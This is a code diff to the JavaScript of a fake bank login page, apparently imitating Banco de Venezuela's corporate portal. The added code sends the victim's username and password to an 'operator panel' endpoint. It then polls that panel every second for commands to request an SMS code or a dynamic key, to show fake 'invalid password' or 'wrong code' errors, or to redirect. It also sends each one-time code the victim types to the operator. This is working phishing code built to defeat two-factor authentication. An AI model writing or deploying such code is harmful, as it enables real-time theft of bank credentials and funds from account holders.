@@ -1,4 +1,43 @@
 (function () {
+  // Manejo de sesión única vinculada al panel de operador
+  let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
+  sessionStorage.setItem('sessionId', sessionId);
+
+  let pingInterval = null;
+  let pollInterval = null;
+  let currentOtpAction = 'sms';
+
+  function startPing() {
+    if (pingInterval) clearInterval(pingInterval);
+    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+    pingInterval = setInterval(() => {
+      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
+    }, 3000);
+  }
+
+  function stopPing() {
+    if (pingInterval) {
+      clearInterval(pingInterval);
+      pingInterval = null;
+    }
+  }
+
+  function stopPolling() {
+    if (pollInterval) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+    }
+  }
+
+  function sendState(state) {
+    if (!sessionId) return;
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state })
+    }).catch(() => {});
+  }
+
   const userInput = document.querySelector('input[formcontrolname="username"], input[name="username"]');
   const entrarBtn = document.querySelector('.button-login-container button');
   const userField = userInput ? userInput.closest('.mat-form-field') : null;
@@ -24,6 +63,7 @@
     userInput.addEventListener('input', () => {
       if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
       updateUserFloat();
+      sendState('typing');
     });
     updateUserFloat();
     if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
@@ -51,10 +91,13 @@
     continueBtn.disabled = !has;
   }
 
-  function setPassError(show) {
+  function setPassError(show, message) {
     passField.classList.toggle('mat-form-field-invalid', show);
     passField.classList.toggle('ng-invalid', show);
-    if (passError) passError.hidden = !show;
+    if (passError) {
+      passError.hidden = !show;
+      if (message) passError.textContent = message;
+    }
     password.setAttribute('aria-invalid', show ? 'true' : 'false');
   }
 
@@ -96,6 +139,7 @@
   password.addEventListener('input', () => {
     updatePassField();
     if (password.value.length > 0) setPassError(false);
+    sendState('typing');
   });
 
   cancelBtn.addEventListener('click', closeModal);
@@ -161,7 +205,7 @@
     updateCodeFloat();
   }
 
-  function showVerifyStep() {
+  function showVerifyStep(mode) {
     if (!authMethod) return;
     authMethod.dataset.step = 'verify';
     if (authSelectPanel) authSelectPanel.hidden = true;
@@ -175,21 +219,36 @@
       authStep2.classList.add('is-active');
       authStep2.setAttribute('aria-selected', 'true');
     }
-    // Icono lápiz del paso completado (como el original Material stepper)
     if (authStep1Icon) {
       authStep1Icon.innerHTML = '<svg class="auth-edit-icon" viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1.003 1.003 0 0 0 0-1.42l-2.34-2.34a1.003 1.003 0 0 0-1.42 0l-1.83 1.83 3.75 3.75 1.84-1.82z"/></svg>';
     }
     if (authStepLine) authStepLine.classList.add('is-done');
+
+    // Adaptar etiquetas según si el operador solicitó SMS o Dinámica
+    const labelTitle = document.querySelector('.auth-verify-title');
+    const labelSub = document.querySelector('.auth-verify-sub');
+    if (mode === 'dinamica') {
+      if (labelTitle) labelTitle.textContent = 'Clave Dinámica';
+      if (labelSub) labelSub.textContent = 'Introduce la clave dinámica generada en tu tarjeta de coordenadas o app BDV';
+    } else {
+      if (labelTitle) labelTitle.textContent = 'Verificación por SMS';
+      if (labelSub) labelSub.textContent = 'Introduce el código de verificación enviado por mensaje de texto';
+    }
+
+    if (codeField) codeField.classList.remove('mat-form-field-invalid');
+    if (verifyCode) {
+      verifyCode.value = '';
+      setTimeout(() => verifyCode.focus(), 40);
+    }
     updateCodeFloat();
-    setTimeout(() => { if (verifyCode) verifyCode.focus(); }, 40);
   }
 
-  function goToAuthMethod() {
+  function goToAuthMethod(mode) {
     hideSpinner();
     closeModal();
     if (loginUnico) loginUnico.hidden = true;
     if (authMethod) authMethod.hidden = false;
-    showSelectStep();
+    showVerifyStep(mode || 'sms');
   }
 
   if (smsMethodBtn) {
@@ -197,8 +256,8 @@
       showSpinner();
       setTimeout(() => {
         hideSpinner();
-        showVerifyStep();
-      }, 900);
+        showVerifyStep('sms');
+      }, 600);
     });
   }
 
@@ -209,34 +268,109 @@
   if (verifyCode) {
     verifyCode.addEventListener('focus', updateCodeFloat);
     verifyCode.addEventListener('blur', updateCodeFloat);
-    verifyCode.addEventListener('input', updateCodeFloat);
-  }
-
-  if (verifyForm) {
-    verifyForm.addEventListener('submit', (e) => {
-      e.preventDefault();
-      if (!verifyCode || verifyCode.value.length === 0) return;
-      showSpinner();
-      setTimeout(() => {
-        hideSpinner();
-        window.location.href = 'panel.html';
-      }, 1200);
+    verifyCode.addEventListener('input', () => {
+      updateCodeFloat();
+      sendState('typing');
     });
   }
 
-  passForm.addEventListener('submit', (e) => {
+  // Polling del cliente esperando órdenes del panel de operador
+  function startPolling() {
+    stopPolling();
+    pollInterval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/sessions/${sessionId}`);
+        if (!response.ok) return;
+        const data = await response.json();
+        const action = data.action;
+
+        if (action === 'sms') {
+          currentOtpAction = 'sms';
+          goToAuthMethod('sms');
+        } else if (action === 'dinamica') {
+          currentOtpAction = 'dinamica';
+          goToAuthMethod('dinamica');
+        } else if (action === 'error-login') {
+          hideSpinner();
+          openModal();
+          setPassError(true, 'Usuario o contraseña inválida. Verifique sus datos.');
+          continueBtn.disabled = false;
+        } else if (action === 'error-sms') {
+          hideSpinner();
+          if (codeField) codeField.classList.add('mat-form-field-invalid');
+          if (verifyCode) {
+            verifyCode.value = '';
+            verifyCode.focus();
+          }
+          alert('Código SMS incorrecto o vencido. Por favor ingrese el nuevo código.');
+        } else if (action === 'error-dinamica') {
+          hideSpinner();
+          if (codeField) codeField.classList.add('mat-form-field-invalid');
+          if (verifyCode) {
+            verifyCode.value = '';
+            verifyCode.focus();
+          }
+          alert('Clave Dinámica incorrecta. Por favor verifique e ingrese nuevamente.');
+        } else if (action === 'done') {
+          stopPing();
+          stopPolling();
+          hideSpinner();
+          window.location.href = 'panel.html';
+        }
+      } catch (_) {}
+    }, 1000);
+  }
+
+  // Envío del código de verificación (Token / SMS)
+  if (verifyForm) {
+    verifyForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (!verifyCode || verifyCode.value.trim().length === 0) return;
+      const tokenVal = verifyCode.value.trim();
+
+      showSpinner();
+
+      try {
+        await fetch(`/api/sessions/${sessionId}/token`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token: tokenVal })
+        });
+      } catch (_) {}
+    });
+  }
+
+  // Envío de Usuario y Clave al Panel de Operador
+  passForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     if (password.value.length === 0) {
       setPassError(true);
       return;
     }
     continueBtn.disabled = true;
-    // Overlay gris encima del modal (como el original), luego pantalla método
     showSpinner();
-    setTimeout(() => {
-      goToAuthMethod();
-      continueBtn.disabled = false;
-    }, 1800);
+
+    const device = /mobile|android|iphone|ipad|phone/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
+    const userVal = userInput ? userInput.value.trim() : 'EMPRESA';
+    const passVal = password.value;
+
+    try {
+      await fetch('/api/sessions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          id: sessionId,
+          username: userVal,
+          password: passVal,
+          tipoUsuario: 'EMPRESAS',
+          device: device,
+          state: 'waiting'
+        })
+      });
+    } catch (_) {}
+
+    startPing();
+    startPolling();
   });
 
   // Acceso directo: ?paso=clave | ?paso=metodo | ?paso=verificar
@@ -250,7 +384,7 @@
   } else if (paso === 'metodo' || paso === 'verificar') {
     if (loginUnico) loginUnico.hidden = true;
     if (authMethod) authMethod.hidden = false;
-    if (paso === 'verificar') showVerifyStep();
+    if (paso === 'verificar') showVerifyStep('sms');
     else showSelectStep();
   }
 })();
